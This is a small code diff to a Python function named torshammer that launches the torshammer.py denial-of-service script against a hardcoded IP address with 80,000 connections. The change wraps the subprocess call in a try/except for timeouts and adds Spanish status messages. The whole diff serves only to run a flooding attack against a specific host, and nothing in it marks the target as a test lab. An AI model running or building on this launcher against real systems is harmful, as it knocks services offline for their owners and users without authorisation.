@@ -23,7 +23,14 @@ def torshammer(ip_addresses, port):
       #  os.system(command)
         command = ["python2.7", "torshammer.py", "-t", "140.30.20.5", "-p", str(port), "-r", "80000"]
         #subprocess.call(command)
-        subprocess.run(command, timeout=60)
+        #subprocess.run(command, timeout=60)
+        try:
+          completed_process = subprocess.run(command, timeout=60)
+          #subprocess.call(command)
+        except subprocess.TimeoutExpired:
+            print("El comando ha excedido el tiempo de espera de 60 segundos.")
+
+        print("El comando ha finalizado.")
 
 
         
